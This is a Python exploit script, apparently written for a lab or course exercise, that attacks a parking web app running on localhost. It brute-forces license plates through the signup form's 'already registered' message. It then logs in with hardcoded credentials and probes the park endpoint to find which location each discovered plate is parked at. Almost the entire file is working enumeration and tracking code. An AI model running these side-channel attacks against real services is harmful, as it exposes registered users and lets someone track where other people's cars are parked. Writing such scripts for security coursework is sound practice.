#!/usr/bin/env python3
import requests
import time
from bs4 import BeautifulSoup

BASE = "http://localhost:3000"
#valid_plates = []

# -------------------------------------------------------------------------------------------+
# Side loading nr1: Find registered plates through registration process.
def generate_plates():
    letters = ["A", "B", "C", "D", "E"]

    # Generate number plates in order AAA000, AAA001, ...
    for l1 in letters:
        for l2 in letters:
            for l3 in letters:
                prefix = l1 + l2 + l3
                for i in range(1000):
                    yield f"{prefix}{i:03d}"

# Checks whether a plate exists through a post request by exploiting side channel.
# (When creating an account, the site will tell you if a plate is already registered)
def plate_exists(plate: str) -> bool:
    data = {
        "username": "tmpuser",
        "password": "Passw0rd1",
        "password2": "password1",   # Different password avoids creating new user when running exploit.
        "plate": plate,
    }

    r = requests.post(f"{BASE}/signup", data=data, allow_redirects=True)

    # "Server returns following string when plate already exists, can be used to detect plates."
    return "License plate already registered by other user" in r.text

# Goes through the generated plates, and checks if they are registered using plate_exists().
def find_generated_plates(time_limit_seconds=60, max_found=10):
    found_plates = []
    start = time.time()

    for plate in generate_plates():
        elapsed = time.time() - start

        if elapsed >= time_limit_seconds:
            print(f"Stopping plate search after {elapsed:.1f}s")
            break

        if len(found_plates) >= max_found:
            print(f"Stopping plate search after finding {max_found} plates")
            break

        if plate_exists(plate):
            print(f"Found registered plate: {plate}")
            found_plates.append(plate)

    return found_plates
# -------------------------------------------------------------------------------------------+


# -------------------------------------------------------------------------------------------+
# Plate location logic (side channel nr2)
# -------------------------------------------------------------------------------------------+
def login(session, username, password):
    data = {
        "username": username,
        "password": password
    }
    r = session.post(f"{BASE}/login", data=data, allow_redirects=True,)

    # If login fails
    if "Logout" in r.text or "Your parked cars" in r.text or r.url == f"{BASE}/":
        print("Logged in")
        return True
    
    print("Login may have failed")
    print(r.text[:500])
    return False

# Scrape locations to be used when looking for parked cars.
def get_locations(session):
    r = session.get(f"{BASE}/", allow_redirects=True)
    soup = BeautifulSoup(r.text, "html.parser")

    locations = []

    for option in soup.select('select[name="location"] option'):
        loc_id = option.get("value")
        loc_name = option.get_text(strip=True)

        if loc_id:
            locations.append((loc_id, loc_name))

    return locations

# Check using side channel nr2 where found plates are parked.
def is_parked(session, plate, location):
    data = {
        "licensePlate": plate,
        "location": location,
        "mintime": "0"
    }

    r = session.post(f"{BASE}/park", data=data, allow_redirects=True)

    return "This car is already parked in the selected location. Do not waste your money !" in r.text

if __name__ == "__main__":
    session = requests.Session()

    found_plates = find_generated_plates(time_limit_seconds=60, max_found=10)
    print(f"Found plates: {found_plates}")

    if not login(session, "edvin", "aaa1"):
        raise SystemExit("Could not log in")
    
    locations = get_locations(session)

    print("Locations:")
    for loc_id, loc_name in locations:
        print(f" {loc_id} -> {loc_name}")

    for plate in found_plates:
        print(f"\n Testing plate {plate}")

        for loc_id, loc_name in locations:
            if is_parked(session, plate, loc_id):
                print(f"{plate} is parked at {loc_name} ({loc_id})")